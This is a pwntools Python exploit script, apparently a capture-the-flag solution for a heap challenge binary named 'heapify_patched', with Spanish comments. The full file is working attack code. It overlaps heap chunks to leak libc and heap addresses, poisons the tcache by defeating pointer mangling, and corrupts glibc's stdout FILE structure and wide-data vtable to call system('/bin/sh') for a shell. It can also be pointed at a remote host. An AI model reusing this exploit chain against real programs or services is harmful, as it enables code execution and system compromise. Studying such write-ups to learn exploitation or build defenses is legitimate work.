from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
c
'''.format(**locals())

#b *(free+0x6a)
#b *(alloc +89)

exe = './heapify_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'

def i2b(val: int):
    return str(val).encode()

def req2sz(val: int):
    SIZE_SZ = context.bytes
    MALLOC_ALIGNMENT = 2*SIZE_SZ
    MALLOC_ALIGN_MASK = MALLOC_ALIGNMENT - 1
    MIN_CHNK_SZ = SIZE_SZ * 4

    MIN_SZ = (MIN_CHNK_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK

    if val + SIZE_SZ + MALLOC_ALIGN_MASK < MIN_SZ:
        return MIN_SZ
    
    return (val + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK

class Chall:
    def __init__(self):
        self.io = start()
        self.max_allocs = 32
        self.nallocs = 1
        self.huge_chnk = 0x4
    
    def alloc(self, size: int, content: bytes):
        self.nallocs += 1

        self.io.sendlineafter(b"choice: ", i2b(1))
        self.io.sendlineafter(b"size: ", i2b(size))
        self.io.sendlineafter(b"data: ", content)
        self.io.recvuntil(b"index: ")
        idx =  int(self.io.recvuntil(b"\n", drop=True).decode())
        
        return idx
    
    def alloc_without_stdout(self, size:int, content: bytes):
        self.nallocs += 1

        self.io.sendline(i2b(1))
        self.io.sendline(i2b(size))
        self.io.sendline(content)

        return self.nallocs - 1#== idx
    
    def free_without_stdout(self, idx: int):
        self.io.sendline(i2b(2))
        self.io.sendline(i2b(idx))
    
    def free(self, idx: int):
        self.io.sendlineafter(b"choice: ", i2b(2))
        self.io.sendlineafter(b"index: ", i2b(idx))
    
    def view(self, idx: int):
        self.io.sendlineafter(b"choice: ", i2b(3))
        self.io.sendlineafter(b"index: ", i2b(idx))
        return self.io.recvuntil(b"\n", drop=True)
    
    def exit(self):
        self.io.sendlineafter(b"choice: ", i2b(4))
    

def fuzz(end: int = 0x1f000, start: int = 0,):
    payload = []
    mask = 0x696969
    j = 0
    for i in range(start, end):
        if j & 0xff == 0x0a:
            j += 1
            mask -= 1
        val = (j << 24) | mask
        payload.append(val)
        j += 1
    return payload

def ptr_mangle(pos: int, ptr: int):
    return (pos >> 12) ^ ptr

    
if __name__ == "__main__":
    chall = Chall()

    chnk_sz = 0x200
    huge_chnk_sz = (2 * chnk_sz) + 0x10

    chall.alloc(chnk_sz, b"W"*0x18) # uno antes del chunk este raro de proteccion

    A = chall.alloc(huge_chnk_sz, b"A"*huge_chnk_sz)
    B = chall.alloc(chnk_sz, b"B"*chnk_sz)
    C = chall.alloc(chnk_sz, b"C"*chnk_sz)

    chall.alloc(0x18, b"X"*0x18) # limit with top chunk

    chall.free(A) # A goes to unsorted bin

    content = b"D"*huge_chnk_sz + p64(0x0) + p64(req2sz(huge_chnk_sz)| 0x1) #sobreescribo size de B para que sea mas grande
    A = chall.alloc(huge_chnk_sz, content)

    E = chall.alloc(huge_chnk_sz, b"Y"*huge_chnk_sz) #por lo que sea, si no hago esto explota, tiene que ver
    # con que las alocaciones se copian en el chunk este falso de entre medias

    chall.free(B) # B goes to unsorted

    B = chall.alloc(chnk_sz, b"E"*0x10) # parto B para que las direcciones se escriban al comienzo de C

    libc_leak = u64(chall.view(C).ljust(8, b"\x00"))
    libc.address = libc_leak - 0x1d2cc0
    tls_address = libc.address - 0x3000

    log.success(f"Libc leak {hex(libc.address)}")
    log.success(f"Tls leak {hex(tls_address)}")

    D = chall.alloc(chnk_sz, b"E"*0x10) # dejo el heap limpio (quito el restante de unsorted bin)
    #ahora D y C apuntan al mismo chunk

    chall.free(D) # D (C) goes to tcache bin

    heap_mask = u64(chall.view(C).ljust(8, b"\x00"))
    heap_base = (heap_mask << 12) - 0x1000
    log.success(f"Heap leak: {hex(heap_base)}")

    D = chall.alloc(chnk_sz, b"E"*0x10) # dejo el heap limpio otra vez
    '''
    --------
    0x420 <-A
    --------
    0x210 <-B
    --------
    0x210 <-C == D 
    --------
    0x20 limit
    --------
    0x420 <-E
    --------
    0x1ede0 top
    '''

    ##### TCACHE POISONING #####

    #### overwrite stdout _IO_FILE struct ####
    IO_2_1_stdout = libc.address + 0x1d3760
    log.info(f"_IO_2_1_stdout: {hex(IO_2_1_stdout)}")
    _wide_data = IO_2_1_stdout + 0xa0
    vtable = IO_2_1_stdout + 0xd8
    IO_wfile_jumps = libc.address + 0x1cf0a0

    #### stdout->_flags = "/bin/sh\x00" ####
    buf1_chnk_addr = heap_base + 0x2140
    buf1 = chall.alloc(chnk_sz, b"buf1")
    buf2 = chall.alloc(chnk_sz, b"buf2")

    chall.free(buf2)
    chall.free(buf1) #tcache_bin[0x200]: buf1 -> buf2
    chall.free(E)

    '''
    ...
     0x20 limit
    --------
    0x420 <-E
    --------
    0x200 <-buf1
    --------
    0x200 <-buf2
    --------
    0x1ede0 top
    '''

    target = IO_2_1_stdout
    target_mangled = ptr_mangle(buf1_chnk_addr, target) 

    content =   b"E"*huge_chnk_sz + \
                p64(0x0) + p64(req2sz(chnk_sz) | 1) + \
                p64(target_mangled)
    E = chall.alloc(huge_chnk_sz, content)

    buf1 = chall.alloc(chnk_sz, b"buf1") 
    chall.io.sendlineafter(b"choice: ", i2b(1))
    chall.io.sendlineafter(b"size: ", i2b(chnk_sz))
    chall.io.sendlineafter(b"data: ", b"/bin/sh\x00")

    ##### FROM NOW ON STDOUT DOESN'T WORK!!! #####
    #### I also left tcache_bin[0x210] corrupted ####

    #chnk_sz = chnk_sz + 0x10 #just so that they go in a different tcache_bin


    #### stdout->vtable = _IO_wfile_jumps + 0x10 ####

    buf1_chnk_addr = buf1_chnk_addr + 0x840
    fake_wide_data = buf1_chnk_addr
    fake_wide_vtable = buf1_chnk_addr

    aux = chall.alloc_without_stdout(huge_chnk_sz, b"just aux")
    rw_area = libc.address + libc.get_section_by_name(".got.plt").header.sh_addr + 0x18
    content = flat( 
                    fuzz(end=0x3),
                    p64(libc.sym['system']),
                    p64(0xffffffffffffffff)*0x18, #so that _IO_switch_to_wget_mode+0x13 doesn't jump
                    p64(fake_wide_vtable)
    )
    buf1 = chall.alloc_without_stdout(chnk_sz, content)
    buf2 = chall.alloc_without_stdout(chnk_sz, b"buf2")

    chall.free_without_stdout(buf2)
    chall.free_without_stdout(buf1) #tcache_bin[0x200]: buf1 -> buf2
    chall.free_without_stdout(aux)

    target = _wide_data
    target_mangled = ptr_mangle(buf1_chnk_addr, target) 

    content =   b"E"*huge_chnk_sz + \
                p64(0x0) + p64(req2sz(chnk_sz) | 1) + \
                p64(target_mangled)
    aux = chall.alloc_without_stdout(huge_chnk_sz, content)
    buf1 = chall.alloc_without_stdout(chnk_sz, b"buf1") 

    content = flat( p64(fake_wide_data),
                    p64(0x0)*0x6,
                    p64(IO_wfile_jumps + 0x10) #calls _IO_seekoff instead of xsputn
    )
#   b _IO_switch_to_wget_mode
    chall.io.sendline(i2b(1))
    chall.io.sendline(i2b(chnk_sz))
    chall.io.sendline(content)
    
    log.success("Getting shell...")
    chall.io.interactive()
    chall.io.close()